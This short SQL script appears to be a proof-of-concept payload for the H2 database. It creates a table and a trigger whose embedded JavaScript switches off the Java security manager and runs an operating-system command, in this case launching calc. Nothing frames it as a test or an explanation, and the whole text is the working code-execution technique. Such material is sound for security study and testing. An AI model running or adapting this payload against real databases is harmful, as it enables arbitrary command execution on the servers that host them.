CREATE TABLE test (id INT NOT NULL);
CREATE TRIGGER TRIG_JS BEFORE INSERT ON TEST AS '//javascript
Java.type("java.lang.System").setSecurityManager(null);Java.type("java.lang.Runtime").getRuntime().exec("calc");';